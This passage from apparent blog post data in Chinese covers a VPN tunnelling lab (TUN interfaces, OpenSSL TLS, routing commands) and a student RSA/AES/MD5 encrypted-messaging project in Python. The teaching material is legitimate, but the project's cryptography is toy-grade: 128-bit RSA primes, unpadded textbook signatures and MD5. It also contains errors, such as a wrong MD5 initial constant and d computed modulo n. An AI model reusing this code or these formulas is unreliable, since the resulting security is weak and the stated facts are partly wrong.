&amp;readFDSet)) // 当tun的文件fd可以读写 tunSelected(tunfd, sockfd); if (FD_ISSET(sockfd, &amp;readFDSet)) // 当socket的文件fd可以读写 socketSelected(tunfd, sockfd); &#125; &#125; 实验环境 实验装置 拓扑图 主机物理网卡配置 实验装置 host u：ubuntu 18.04 VPNserver：ubuntu 18.04 host V：ubuntu 18.04 网络拓扑图 本次实验需要三台主机，分别作为host U(VPN 用户)，VPN服务, host V(内网主机)。 host V处于192.168.60.0/24网段，属于内网。 host U处于10.0.2.0/24网段，属于外网，host V 和 host U在没有VPN的情况下无法通信。 VPN server有两张网卡，一张网卡的IP地址为192.168.60.1处于192.168.60.0/24网段，作为host V的网关，并可以与其通信；而另一张网卡地址为10.0.2.8属于外网网段，可以与host U通信，同时其作为host U的VPN服务器，实现与host V通信。 主机物理网卡配置 主机 角色 IP地址 客户机 VPN客户机/host U 10.0.2.7/24 服务器 VPN服务器/网关 10.0.2.8/24192.168.60.1/24 内网主机 host V 192.168.60.101/24 tun0 虚拟网卡配置 主机 虚拟接口 IP地址 服务器 tun0 192.168.53.1/24 客户机 tun0 192.168.53.5/24 环境搭建运行了三台ubuntu的虚拟机，关系如上面描述 服务器主机服务器主机需要两块网卡，这里通过VM再添加一块网卡即可，配置如图 运行vpnserver程序，运行后会出现一个tun0网卡 使用命令配置tun0 ifconfig tun0 192.168.53.1/24 up 由于 VPN Server 需要在私网和隧道之间转发数据包，因此它也需要充当网关，这是通过在 VPN Server 上启用 IP 转发来实现的。 sysctl net.ipv4.ip_forward=1 host v客户端运行./vpnclient，之后会出现一个tun0接口，然后对其配置 ifconfig tun0 192.168.53.5/24 up 配置路由经过以上两步，隧道就建立起来了，然后我们设置路由路径以将预期流量引导到客户端和服务器机器上的隧道。在 host v上，我们将所有进入专用网络 (192.168.60.0/24) 的数据包定向到 tun0 接口，数据包将从该接口通过 VPN 隧道转发。我们使用 route 命令在 host v 上添加以下路由条目： route add -net 192.168.60.0/24 tun0 在服务器主机上，将流向 192.168.53.0/24 网络的流量定向到 tun0 接口 内网主机上为了通过 VPN 隧道将 Host V （内网主机）回复发送到 Host U，我们在 Host V 上添加了一个路由条目，它将去往 Host U 网络的数据包路由到 VPN Serve。从 VPN Server，这个数据包将通过 VPN 隧道到达 VPN Client，最终到达 Host U。 下面显示了 Host V 上的路由条目 route add -net 192.168.53.0/24 gw 192.168.60.1 ens33 验证通信ping 测试cliet ping 内网主机 内网主机ping client 内网主机追踪路由，可以看到经过网关192.168.60.1到达了目的地址 查看vpnclient和vpnserver程序的运行情况 VPN client 在发送 ping 请求时，vpnclient反映已收到 TUN 接口上的数据包（ping 请求）并连续收到隧道中的包（ping 回复） VPN server 在 vpnserver上，程序反映从隧道接收数据包（ping 请求），然后从 TUN 接收数据包（ping 回复） ssh测试在host V执行 ssh root@192.168.60.101 在 host U上执行 ssh root@10.0.2.7 通过上面的测试可以确定两台主机可以通过VPN程序进行远程控制。 二、TSL VPN有了上面基于TCP的VPN，再做TSL就会简单很多。 程序实现ssl初始化创建SSL数据结构，用于建立TLS连接 VPN server SSL* SSLLibInit() &#123; SSL_METHOD *meth; SSL_CTX* ctx; SSL *ssl; int err; // OpenSSL 初始化 SSL_library_init(); SSL_load_error_strings(); SSLeay_add_ssl_algorithms(); // SSL 初始化 meth = (SSL_METHOD *)TLSv1_2_method(); ctx = SSL_CTX_new(meth); SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL); // 加载服务器证书和私钥文件 SSL_CTX_use_certificate_file(ctx, &quot;./cert_server/server.pem&quot;, SSL_FILETYPE_PEM); SSL_CTX_use_PrivateKey_file(ctx, &quot;./cert_server/server-key.pem&quot;, SSL_FILETYPE_PEM); ssl = SSL_new (ctx); return ssl; &#125; VPN client SSL* setupTLSClient(const char* hostname) &#123; // OpenSSL 初始化 SSL_library_init(); SSL_load_error_strings(); SSLeay_add_ssl_algorithms(); SSL_METHOD *meth; SSL_CTX* ctx; SSL* ssl; meth = (SSL_METHOD *)TLSv1_2_method(); ctx = SSL_CTX_new(meth); SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, verify_callback); //指明是否要求提供证书 if (SSL_CTX_load_verify_locations(ctx,NULL, CA_DIR) &lt; 1) &#123; //加载可信CA证书，进行证书验证 printf(&quot;Error setting the verify locations. \\n&quot;); exit(0); &#125; ssl = SSL_new (ctx); X509_VERIFY_PARAM *vpm = SSL_get0_param(ssl); X509_VERIFY_PARAM_set1_host(vpm, hostname, 0); return ssl; &#125; TCP连接TCP连接与上面的连接一样。 TLS握手 SSL_set_fd()将SSL绑定到一个TCP连接调用SSL_connec()启动与服务器的TLS握手协议) /*----------------TLS initialization ----------------*/ ssl = setupTLSClient(hostname); printf(&quot;TLSClientsetup initialisation is successful\\n&quot;); /*----------------Create a TCP connection ---------------*/ int sockfd = setupTCPClient(hostname, port); printf(&quot;TCPClientsetup is successful\\n&quot;); /*----------------TLS handshake ---------------------*/ SSL_set_fd(ssl, sockfd); //绑定TCP连接 printf(&quot;SSL_set_fd() is successful\\n&quot;); int err = SSL_connect(ssl); CHK_SSL(err); printf(&quot;SSL connection is successful\\n&quot;); printf(&quot;SSL connection using %s\\n&quot;, SSL_get_cipher(ssl)); 数据转发数据转发的原理与基于UDP/TCP的VPN 的原理 void processRequest(int tunfd, SSL* ssl, int sockfd) &#123; while(1) &#123; fd_set readFDSet; FD_ZERO(&amp;readFDSet); FD_SET(sockfd, &amp;readFDSet); FD_SET(tunfd, &amp;readFDSet); select(FD_SETSIZE, &amp;readFDSet, NULL, NULL, NULL); if (FD_ISSET(tunfd, &amp;readFDSet)) tunSelected(tunfd, sockfd, ssl); if (FD_ISSET(sockfd, &amp;readFDSet)) socketSelected(tunfd, sockfd, ssl); &#125; &#125; 实验环境由于在上ubuntu 18.04上运行时，程序出现错误，所以使用了seedLab 提供的 ubuntu 16.04重新搭建了实验环境。各个网卡信息与上面的实验一样。 host U：ubuntu 16.04 VPNserver：ubuntu 16.04 host V：ubuntu 16.04 主机物理网卡配置 主机 角色 IP地址 客户机 VPN客户机/host U 10.0.2.7/24 服务器 VPN服务器/网关 10.0.2.8/24192.168.60.1/24 内网主机 host V 192.168.60.101/24 连通性测试配置完各个网卡的IP地址后 host U 可以 ping 通 VPNserver (10.0.2.0/24) VPN server 可以ping 通两台主机 host V可以ping 通VPNserver (192.168.60.0/24) CA和证书设置(1)、为 CA 生成一个自签名证书，它将作为根证书，如下所示： openssl req -new -x509 -keyout ca.key -out ca.crt -config openssl.cnf //文件 ca.key 包含 CA 的私钥，而 ca.crt 包含公钥证书。 (2)、接下来，我们使用以下命令为服务器创建一个 RSA 公私钥对 openssl genrsa -aes128 -out server.key 1024 (3)、创建一个包含服务器公钥的证书签名请求 (CSR)。 CSR 具有以下详细信息，服务器的通用名称为 sunzy.com： openssl req -new -key server.key -out server.csr -config openssl.cnf (4)、然后将上述 CSR 发送到 CA 以生成密钥和通用名称的证书。 openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt (5)、将服务器的证书和密钥存储为 pem 文件，这里是 cp server.crt server-cert.pem cp server.key server-key.pem VPN Server 程序使用这些文件来加载证书和私钥，如下所示 (6)、使用名称作为主题字段的哈希存储服务器的证书。这是因为在接收服务器的证书时，TLS 会根据颁发者的身份信息生成一个哈希值，并使用此哈希值在“./cert”文件夹中查找颁发者的证书，命令如下:(以下命令在ca_client 文件下执行) openssl x509 -in ca.crt -noout -subject_hash ln -s ca.crt b4386d70.0 建立TLS通信VPN server首先在VPN服务器上执行以下命令，将c程序编译为可执行程序 gcc -o vpnserver_tls vpnserver_tls.c -lssl -lcrypto -lcrypt 执行编译好的程序，此时该程序处于监听状态等待客户端的连接 此时该程序将创建一个tun0虚拟网卡，使用以下命令配置网卡信息 sudo ifconfig tun0 192.168.53.1/24 up 配置完后的网卡信息如图： 编辑路由表并将设置为转发模式 sudo route add –net 192.168.53.0/24 tun0 sudo sysctl net.ipv4.ip_forward=1 VPN client与服务器上一样，首先编译c程序 gcc -o vpnclient_tls vpnclient_tls.c -lssl -lcrypto 执行该程序（该域名与上面创建的证书中的通用名称一样） sudo ./vpnclient_tls &quot;sunzy.com&quot; 4433 创建连接后，服务器端确认后，开始身份认证 服务器端收到的消息如下 此时TLS连接已经建立。 配置tun0和路由表 sudo ifconfig tun0 192.168.53.5/24 up sudo route add -net 192.168.60.0/24 Host V要实现内外网主机之间的通信，还需要在内网主机上添加路由表信息 sudo route add -net 192.168.53.0/24 gw 192.168.60.1 enp0s3 VPN server和VPN client 的连接信息VPN server VPN client 通信验证ping 测试 客户端（10.0.2.7）ping 内网主机（192.168.60.101） 内网主机(192.168.60.101) ping 10.0.2.7 查看客户端上的 Wireshark 数据时，我们看到 ping 请求从 tun0 发送到内部网络 IP，并且此数据包从 VPN 客户端发送到 VPN tunnel 在服务器端，我们看到类似的流量——主机 U 和主机 V 之间的 ping 请求和回复通信，中间有 VPN 服务器。 telnet 测试 首先在在Host U上使用telnet控制Host V 在内网主机Host V 上telnet 客户端HostU wireshark抓取的telnet的通信数据包 VPN server上的数据包信息 命令集合VPN server//编译程序 gcc -o vpnserver_tls vpnserver_tls.c -lssl -lcrypto -lcrypt //启动程序 sudo ./vpnserver_tls 4433 //设置tun0信息 添加转发功能 添加路由 sudo ifconfig tun0 192.168.53.1/24 up sudo sysctl net.ipv4.ip_forward=1 sudo route add -net 192.168.53.0/24 tun0 sudo route add -net 192.168.60.0/24 tun0 VPN client//编译程序 gcc -o vpnclient_tls vpnclient_tls.c -lssl -lcrypto //启动程序 sudo ./vpnclient_tls sunzy.com 4433 //设置tun0信息 添加路由 sudo ifconfig tun0 192.168.53.5/24 up sudo route add -net 192.168.60.0/24 内网主机route add -net 192.168.53.0/24 gw 192.168.60.1 enp0s3","tags":[{"name":"socket","slug":"socket","permalink":"https://sunzhengyu99.github.io/tags/socket/"}]},{"title":"RSA_AES","date":"2021-07-21T07:57:29.000Z","path":"2021/07/21/RSA-AES/","text":"西北工业大学夏令营考核项目 一、实验要求 （ 1） 用 RSA 算法实现两个主机之间的密钥分发， 分发的密钥为 0x 01 23 45 67 或 0x 01 23 45 67 89 AB CD EF；（ 2） 用分发的密钥和 AES 加密算法， 实现两个主机之间的加密数据传输， 测试数据是“NPU-SCS” 和其他自己构造的 7 条消息；（ 3） 以上 2 个步骤在程序中自动执行完， 无手动参与； 程序可以在同一台主机上完成， 但数据必须经过网络传输（ 可以本地发送， 本地接收）；（ 4） 密码算法必须是源码编译得到， 不能直接用编译过的库文件；RSA 和 AES 算法的源码可以来自于网络或其他任意渠道；（ 5） 以上算法选择国密算法实现更佳；（ 6） 用 Python 或 C/C++语言实现程序， 写出技术开发文档， 录制一段不超过 8 分钟的演示视频。 提交技术开发文档、 演示视频。 二、需求分析设传输文件的双方分别为Alice和Bob，Alice为传输文件的一方，Bob作为接收文件的一方。 首先确定使用Windows的socket套接字实现网络通信，Bob作为服务器一方，等待Alice的连接，然后Alice向Bob发送数据。 安全需求如下: 使用RSA算法生成Alice和Bob使用的公钥，并计算出私钥后分发，为后续的数字签名（MD5）和对称加密密钥（AES）的加解密做准备。 因为是在公共信道中传输数据，所以可能存在攻击者冒充bob接收文件，所以Alice在与传输文件之前需要对bob的身份进行认证，而且bob防止被欺骗也需要对Alice的身份进行认证，这里可以采用第二类签名算法。 在确认彼此身份后需要将文件通过公共信道传输，但是可能存在数据，所以需要对文件内容加密，考虑到加密速度问题，所以采用对称加密算法（AES）。 采用对称加密算法需要密钥，而这里使用的密钥的为0x12345678。并且这个密钥也需要传给bob用于解密，但是公共信道不安全，所以也需要对该密钥进行加密。考虑到密钥长度不是很大，所以可以采用公钥加密算法，而且公钥加密算法可以不传输此次加密使用的密钥，提高安全性和效率。 当Bob收到对应的密钥并解密密文后，需要向Alice发送一个确认收到的消息，防止截断攻击，确认消息也要使用到第一步使用的签名算法。 三、设计原理从上面的需求分析可以知道，整个程序需要用的MD5，RSA，AES算法，最后使用socket编程实现通信。 3.1 MD5​ MD5是hash函数的一种，而 Hash，一般翻译做散列、杂凑，或音译为哈希，是把任意长度的输入(又叫做预映射)通过散列算法变换成固定长度的输出，该输出就是散列值。这种转换是一种压缩映射，也就是说，散列值的空间通常远小于输入的空间，不同的输入可能会散列成相同的输出，所以不可能从散列值来确定唯一的输入值。简单的说就是是将任意长度的输入变换为固定长度的输出的不可逆的单向密码体制。 ​ MD5(Message-Digest Algorithm,信息摘要算法)，是由美国著名密码学家Rivest设计的一种密码散列函数，可以将长度小于264比特的消息，按512比特的分组单位进行处理，输出一个128比特的消息摘要。 MD5 算法输入不定长度信息，输出固定长度 128-bits 的算法。经过程序流程，生成四个 32位数据，最后联合起来成为一个 128-bits 散列。基本方式有求余、取余、调整长度、与链接变量进行循环运算， 得出结果。基本流程如下图所示： 3.1.1 消息填充 使消息长度模512=448如果消息长度模512恰等于448，增加512个填充比特。即填充的个数为1~512，填充方法：第1比特为1，其余全部为0 将消息长度转换为64比特的数值，如果长度超过64比特所能表示的数据长度，值保留最后64比特添加到填充数据后面，使数据为512比特的整数倍 512比特按32比特分为16组 处理过程如下 3.1.2 初始化链接变量使用4个32位的寄存器A， B，C， D存放4个固定的32位整型参数，用于第一轮迭代，这里需要注意的是，寄存器的值要转化为小端序。 A=0x1234567 B=0x89ABCDEF C=0xFEDCBA98 D=0x76543210 3.1.3 分组处理 由4轮组成，521bit的消息分组Mi被均分为16个分组，参与每轮16步函数运算，即每轮包括16个步骤。每步的输入是4个32bit的链接变量和1个32bit的消息子分组，输出为32位值 经过4轮共64步后，得到的4个寄存器值分别与输入链接变量进行模加，即得到此次分组处理的输出链接变量 4轮操作之前，先将前一分组的链接变量(A、B、C、D的值)复制到备用记录单元，以便执行最后的模加操作 处理过程如下图 3.1.4 步函数MD5每轮包含16步，每轮的步函数相同，即使用同一个非线性函数，而不同轮的步函数使用的非线性函数是不同的，即四轮使用4个不同的非线性函数。设X、Y、Z是3个32比特的输入变量，输出是一个32比特变量，则这4个非线性函数F、G、H和I定义为： F(X,Y,Z)=(X&amp;Y)|((~X)&amp;Z) G(X,Y,Z)=(X&amp;Z)|(Y&amp;(~Z)) H(X,Y,Z)=X^Y^Z I(X,Y,Z)=Y^(X|(~Z)) MD5步函数的执行过程： 伪随机常数 T[ i ]，可以消除输入数据的规律性，i为弧度，1 ≤ i ≤ 64，方框代表取整数部分 轮函数先取向量(A、B、C、D)中的后3个作一次非线性函数运算，所得的结果一次加上第1个变量，32bit消息子分组和1个伪随机常数，再将所得的结果循环左移指定位数，并加上(A、B、C、D)的第二个变量，最后把新值赋给向量中的第1个变量。 3.1.5 主循环​ 算法具体步骤如图 正确性验证 在线网站：https://md5jiami.bmcx.com/ 处理字符串: I love cumt very much 3.2 RSA​ 在Diffie和Hellman提出公钥密码体制的设想后，Merkle和Hellman首先共同提出MH背包公钥加密体制，随后Rivest、Shamir、Adleman联合提出RSA公钥加密体制。RSA虽晚于MH背包公钥加密体制，但它是第一个安全、实用的公钥加密算法，已成为国际标准。 RSA的基础是数论的欧拉定理，它的安全性依赖于大整数因子分解的困难性。且因为加解密次序可换，RSA公钥佳美体制既可用于加密，也可用于设计数字签名体制。RSA算法原理 ​ 安全性基于大素数因子分解的困难问题，整体算法流程简单清晰，分为如下三个部分： （1）密钥生成算法： ​ ① 选取两个保密的大素数𝑝和𝑞，满足𝑝 ≠ 𝑞，计算𝑛 = 𝑝 × 𝑞, 𝜑(𝑛) = (𝑝 − 1)(𝑞 − 1), 𝜑(𝑛) 为𝑛的欧拉函数。 ​ ② 随机选取整数𝑒, 满足1 &lt; 𝑒 &lt; 𝜑(𝑛)且gcd(𝑒, 𝜑(𝑛)) = 1，即𝑒与𝜑(𝑛)互素。 ​ ③ 计算𝑑, 满足𝑒𝑑 ≡ 1(𝑚𝑜𝑑 (𝑛))，则公钥为(𝑒, 𝑛), 私钥为𝑑。 （2）加密 对明文进行比特串分组，使每个分组十进制小于𝑛 , 然后对每个分组𝑚(0 ≤ 𝑚 &lt; 𝑛),计算 𝑐 = 𝑚𝑒 (𝑚𝑜𝑑 𝑛)，则得到密文 c。 （3）解密 对于密文𝑐(0 ≤ c &lt; n), 有𝑚 = 𝑐𝑑 (𝑚𝑜𝑑 𝑛)， 即可得到明文m。 3.2.1 大素数生成要去寻找一个任意的大素数是很困难的事,但是可是先随机生成一个大奇数,再通过多次素性检验检测是否为宿舍,如果多次检测都为素数则可确定为素数. 随机生成大奇数此算法可以根据需要生成固定位数的数,当生成奇数后,会通过素性检验,如果通过检查,则素数生成成功 # 生成素数 先生成1024位的奇数，再进行素性检验，通过则生成该素数 def genPrime(b=1024): while True: # 设置死循环直到生成素数才退出 res = &quot;1&quot; for i in range(b-2): res += str(random.randint(0,1)) res += &quot;1&quot; # 最后一位为1保证为奇数 res = int(res,2) if miller_rabin(res): return res # 直到该数通过素数检验才推出循环 Miller-Rabin素性检验​ 在本实验中，我使用了 Miller-Rabin 素性检验结合随机数的生成来得到所需要的大素数， 它是一个基于概率的算法，是费马小定理的一个改进。 简单来说， 要测试𝑛是否为素数，首先将𝑛 - 1分解为2𝑠𝑑。 在每次测试开始时，先随机选一个介于[1, 𝑛 - 1]的整数𝑎，之后如果对所有的𝑟 ∈ [0, 𝑠 - 1]， 若𝑎𝑑 ≠ 1(𝑚𝑜𝑑 𝑛)且𝑎^((2^𝑟)*𝑑) ≠-1(𝑚𝑜𝑑 𝑛)，则𝑛是合数。否则， 𝑛有3/4的概率为素数，随着增加测试的次数，是素数的概率会越来越高，当达到某一次数时，为素数的概率可以接近100%。 def miller_rabin(n): s = n - 1 t = 0 while s % 2 == 0: # n,s,t之间的关系为 n = 2^s * t s = s // 2 t += 1 for trials in range(10): # 可以多增加几轮保证大概率为素数 a = random.randrange(2, n - 1) # 随机生成a v = pow(a, s, n) # 验证 a^(n-1) mod n if v != 1: i = 0 while v != (n - 1): if i == t - 1: return False else: i = i + 1 v = (v ** 2) % n return True 3.2.2 生成公钥e𝑒需要满足1 &lt; 𝑒 &lt; 𝜑(𝑛)且gcd(𝑒, 𝜑(𝑛)) = 1，即𝑒与𝜑(𝑛)互素。 这里为了保证安全性，设置了e的值不能小于2000。 def genE(phi_n): while True: e = genPrime(b=random.randint(3,13)) #随机生成e if e &lt; 2000 : # e不能太小 continue if phi_n%e != 0: # 保证e不能被phi整除 return e 3.2.3 计算私钥d模重复平方法为了提高大数模时的计算速度，这里采用的时模重复平方法。 算法伪代码如图 计算私钥d在RSA算法中求私钥中的整数d时，需要使得 (e * d ) % m = 1，该方程等价于 e * d = 1 + y * m ，也等价于 e * d - y * m = 1。（都为整数） 因此求解d的过程就是求解该二元一次方程组（e和m已知，求解d），即求e模m的逆元。 使用欧几里得扩展算法求逆元(辗转相除法) 给定模数m，求a的逆相当于求解ax=1(mod m)这个方程可以转化为ax-my=1然后套用求二元一次方程的方法，用扩展欧几里得算法求得一组x0,y0和gcd检查gcd是否为1gcd不为1则说明逆元不存在若为1，则调整x0到0~m-1的范围中即可 具体代码如下 def caculateD(a, m): u1,u2,u3 = 1,0,a v1,v2,v3 = 0,1,m while v3!=0: q = u3//v3 v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3 return u1%m 3.2.4加解密过程有了以上的基础，RSA的加解密就很简单了，直接套用公式即可。 def RSAEncode(m, e, n): # 加密公式 m^e mod n m = int(str2Hex(m), 16) # 将字符转换为二进制 c = fast_mod(m, e, n) return c def RSADecode(c, d, n): # 加密公式 c^d mod n plaintext = fast_mod(c,d,n) plaintext = str(long_to_bytes(plaintext).decode()) # 将数字转换为字符 return plaintext 3.2.5 正确性验证 3.3 AESAES加密算法同DES相同都是分组加密算法，AES是对128位数据进行加密，密钥也是128位，加密后产生128位的密文，AES的加密轮数为10轮，明文和密钥都被分为4组，每组32bit。 AES为分组密码，每组长度相等，每次加密一组数据，直到加密完整个明文。 在AES标准规范中，分组长度只能是128位，也就是说，每个分组为16个字节（每个字节8位）。 密钥的长度可以使用128位、192位或256位甚至更多，密钥的长度不同，加密轮数也不同，如下表所示： 以下以AES-128为例进行阐述，AES的加密公式为C = E(K,P)，在加密函数E中，会执行一个轮函数，并且执行10次这个轮函数，这个轮函数的前9次执行的操作是完全一样的，只有第10次略有不同，即每个明文分组会进行10轮加密。 AES的处理单位是字节，128位的输入明文分组P和输入密钥K都被分成16个字节，分别记为P = P0 P1 … P15 和 K = K0 K1 … K15。明文分组用字节为单位的正方形矩阵描述，称为状态矩阵。在算法的每一轮中，状态矩阵的内容不断发生变化，最后的结果作为密文输出。 该矩阵中字节的排列顺序为从上到下、从左至右依次排列，如下图所示： 同样，128位密钥也是用字节为单位的矩阵表示，矩阵的每一列被称为1个32位比特字。通过密钥编排函数该密钥矩阵被扩展成一个44个字组成的序列W[0],W[1], … ,W[43],该序列的前4个元素W[0],W[1],W[2],W[3]是原始密钥，用于加密运算中的初始轮密钥加（下面介绍）;后面40个字分为10组，每组4个字（128比特）分别用于10轮加密运算中的轮密钥加，如下图所示： 上图中，W[0] = K0 K1 K2 K3 。 AES加密算法主要步骤有： 轮密钥加：AddRoundKey 字节替代：ByteSub 行移位： ShiftRow 列混肴： MixColumns AES的整体结构如下图所示，其中的W[0,3]是指W[0]、W[1]、W[2]和W[3]串联组成的128位密钥。加密的第1轮到第9轮的轮函数一样，包括4个操作：字节代换、行位移、列混合和轮密钥加。最后一轮迭代不执行列混合。另外，在第一轮迭代之前，先将明文和原始密钥进行一次异或加密操作。 下面分别介绍AES中一轮的操作阶段，这些操作阶段使输入位得到充分的混淆。 3.3.1 字节代换​ AES的字节替换，本质上和DES的S盒替换是一样的，都是根据输入字节查表来获得对应的输出字节，不同的是，AES的S盒规格是16*16的字节矩阵。因此，字节替换步骤也是AES算法轮函数的关键，相较于其他运算步骤的线性特征而易于分析，S盒的非线性提供了更好的安全性。​ 字节替换的规则是，将状态矩阵中的每个字节的高4位作为行值，低4位作为列值，取出S盒中对应的矩阵字节元素作为替换字节。例如状态矩阵中某个输入字节值为0x6b（01101011），那么行值为6（0110），列值为b（1011），查询如表4.1所示S盒，得到的输出字节为0x7f(01111111) ​ 经过该步骤的字节替换之后，输入的4*4字节状态矩阵中的每个字节元素都被新字节替代，得到的新状态矩阵将作为下一步行移位的输入。 3.3.2 行移位行移位步骤对输入的状态矩阵进行简单的行循环移位操作（不同行的移位数不同，具体移位数由算法输入决定），本文以第几行左移几个字节为例，行移位过程如图5.1所示，移位完成之后得到的新状态矩阵将作为下一步列混合的输入。 3.3.3 列混淆列混合基于矩阵乘法实现，使得状态矩阵中的每一列的各个元素之间按照预先定义的列混合加密矩阵的权重来产生相互混淆的影响，产生列元素互相之间被混合的新状态矩阵。例如，根据公式6.1进行列混合加密，第0行第0列元素的输出计算表示为： 该元素将第0列所有元素按预设权重混合起来。 [注意]：该公式中的乘法和加法不是普通数学意义的乘和加，而是有限域GF(2^8)四则运算中的乘和加，加法即是按位异或，乘法较为复杂，此处不做赘述，有兴趣的同学可以进一步了解有限域的相关知识。 其他行列的计算公式 AES轮函数中的所有四个步骤都是可逆变换，那么列混合公式如下 3.3.4 轮密钥加轮密钥加的过程十分简单，就是将列混合输出的状态矩阵（共128位）和密钥扩展得到的本轮轮密钥（共128位）进行按位异或，得到最终的本轮状态矩阵输出。 3.3.5 密钥扩展与明文分组矩阵一样，密钥扩展也是以8比特字节作为单位对主密钥进行处理，128位主密钥可以表示为K=[K0,K1,…,K15]的4*4字节矩阵。经过密钥扩展函数，K扩展为44列的轮密钥字矩阵（其中一个字为4字节32位），表示为W=[W0,W1,…W43]。每一轮依次取出前4个字（128位）作为本轮轮密钥，如初始轮轮密钥为W[0,3]=[W0,W1,W2,W3]。密钥扩展的过程如图 3.3.6 正确性验证 3.4 socket通信Socket又称”套接字”，应用程序通常通过”套接字”向网络发出请求或者应答网络请求，使主机间或者一台计算机上的进程间可以通讯。 该项目中的通信流程： server绑定ip和端口 server = socket.socket() #创建对象server.bind((&quot;localhost&quot;,8888))#绑定 ip和端口server.listen() #监听con,addr = server.accept() client创建socket连接server client = socket.socket()client.connect((&#x27;127.0.0.1&#x27;,8888)) # 服务器IP地址和端口 3.5 数字签名​ 数字签名（又称公钥数字签名）是只有信息的发送者才能产生的别人无法伪造的一段数字串，这段数字串同时也是对信息的发送者发送信息真实性的一个有效证明。它是一种类似写在纸上的普通的物理签名，但是使用了公钥加密领域的技术来实现的，用于鉴别数字信息的方法。一套数字签名通常定义两种互补的运算，一个用于签名，另一个用于验证。数字签名是非对称密钥加密技术与数字摘要技术的应用。 实现原理如图： 四、程序实现***加密算法的代码放在另外的文件中 有了上面的原理支撑，整个系统就可以完成了，首先看下整个传输系统的工作过程。 程序整体流程如下图： 具体实现，所有文件如下 ├── AES.py ├── alice_Client.py //数据发送方 ├── bob_Server.py //数据接收方 ├── data // 需要传输的八条数据，这里使用文件存储 │ ├── test0.txt│ ├── test1.txt│ ├── test2.txt│ ├── test3.txt│ ├── test4.txt│ ├── test5.txt│ ├── test6.txt│ └── test7.txt ├── file_decode.py // RSA公私钥生成和文件读取 ├── MD5.py └── RSA.py file_decode.py该函数主要作用有两个 读取文件内容 生成RSA算法的n，并计算出d（每次传输时，使用的n都不一样，算是一种一次一密机制，可以提高安全性） import randomimport refrom RSA import *from MD5 import *from AES import *e = 65537def read_file(num): path = &#x27;.\\data\\\\test&#x27;+str(num)+&#x27;.txt&#x27; try: f = open(path, &#x27;r&#x27;, encoding = &#x27;utf-8&#x27;) text = f.read() f.close() print(&quot;读取成功!&quot;) return text except IOError: print(&quot;读取错误!&quot;)def n_and_d(): p = genPrime(128) q = genPrime(128) phi = (p-1)*(q-1) n = p*q d = caculateD(e,phi) print(&quot;生成的p:&quot;,p) print(&quot;生成的q:&quot;,q) return n,d bob_server.py# -*- coding = utf - 8 -*- #@Time : 2021/7/10 23:17 #@Author : sunzy #@File : bob.py import socket import libnum from RSA import * from MD5 import * from AES import * from file_decode import * name = &quot;This is bob.&quot; # bob的身份信息真实环境中可以为双方知道的秘密 n,d = n_and_d() # 获取n,d e = 65537 server = socket.socket() #创建对象 server.bind((&quot;localhost&quot;,8888))#绑定 ip和端口 server.listen() #监听 #等待连接 print(&#x27;Waiting connection...&#x27;) #接受请求，返回套接字对象和IP+端口号 con,addr = server.accept() con.send(bytes(&quot;Welcome connect!\\n开分发RSA公钥n:\\n&quot;,&quot;utf-8&quot;)) con.recv(1024) # 向alice发送公钥n con.send(bytes(str(n),&quot;utf-8&quot;)) n_alice = con.recv(1024).decode() n_alice = int(n_alice) print(&quot;Alice使用的公钥n:&quot;, n_alice) # 验证alice身份 print(&quot;验证alice身份...&quot;) # a = input() alice_name = con.recv(512).decode() # alice 的明文信息 con.send(b&#x27;1&#x27;) hash_name = con.recv(512).decode() # alice 用私钥加密明文的hash值 plain_text = RSADecode(int(hash_name),e,n_alice) # 用alice 的公钥解密出hash值 if plain_text == md5(alice_name): # 判断上一步的值与md5函数加密是否相同 print(alice_name) # 如果二者相同则可以保证对方是alice,这里的安全性是由公钥算法和hash函数保证 print(&quot;验证通过！&quot;) # 因为只有alice有自己的私钥，hash函数的存在防止伪造明文攻击 con.send(bytes(&quot;您通过了验证!&quot;,&quot;utf-8&quot;)) else: exit(&quot;这不是alice,验证错误！&quot;) #送出自己的身份信息和签名值 print(&quot;等待alice验证自身身份...&quot;) con.send(bytes(name,&#x27;utf-8&#x27;)) # 向alice发送身份信息的明文 con.recv(1024).decode() hash_name = md5(name) # 明文信息的hash值 crpto_name = str(RSAEncode(hash_name, d, n)) # 使用自己的私钥加密上一步的hash值 crpto_name = bytes(crpto_name,&#x27;utf-8&#x27;) # 发送给alice con.send(crpto_name) print(con.recv(1024).decode()) print(&quot;-----------开始接收对称加密密钥-------------&quot;) enc_key = con.recv(1024) enc_key = enc_key.decode() enc_key = int(enc_key) # 将密钥转换为int类 dec_key = fast_mod(enc_key,d,n) print(&quot;收到的对称加密密钥:&quot;,hex(dec_key)) print(&quot;---&quot;*5+&quot;开始接收密文&quot;+&quot;---&quot;*5) # 一共接收八条消息 for i in range(0,8): print(&quot;接收第&#123;0&#125;条消息&quot;.format(i+1)) con.send(b&#x27;1&#x27;) length = con.recv(1024) length = int(length.decode()) buff = [] size = 0 while size &lt; length: # 开始接受密文 dat = con.recv(1024) size += len(dat.decode()) buff.append(dat) data = b&#x27;&#x27;.join(buff) bin_cipher = data.decode() enc_plain = int(bin_cipher) print(&quot;收到的密文:&quot;, enc_plain) plain_text = AES_dec(enc_plain, dec_key) print(&quot;收到的消息:&quot;, plain_text) # 以下是发送确认收到消息和消息的数字签名 message = &quot;Bob received the file successfully!&quot; con.send(bytes(message,&#x27;utf-8&#x27;)) con.recv(1024).decode() hash_message = md5(message) crypt_message = str(RSAEncode(hash_message,d,n)) con.send(bytes(crypt_message,&#x27;utf-8&#x27;)) print(&quot;文件传输结束！&quot;) server.close() alice_client.py# -*- coding = utf - 8 -*- #@Time : 2021/7/10 23:17 #@Author : sunzy #@File : Alice.py from RSA import * from MD5 import * from file_decode import * import socket name = &quot;This is alice.&quot; # alice的身份信息真实环境中可以为双方知道的秘密 # n = 44531776921047477359676235110843825307036514195195627878765712056028758572817 测试使用的n # d = 34159352569920789505556306994405309761109146525598570740717995833480670158209 n,d = n_and_d() e = 65537 # e使用的都是65537对安全性 client = socket.socket() client.connect((&#x27;127.0.0.1&#x27;,8888)) # 本机地址和端口 data = client.recv(1024) print(str(data, &quot;utf-8&quot;),end=&quot;&quot;) # 连接成功提示消息 client.send(b&#x27;1&#x27;) n_bob = client.recv(1024).decode() n_bob = int(n_bob) print(&quot;bob使用的公钥n:&quot;,n_bob) # 向bob发送自己的n 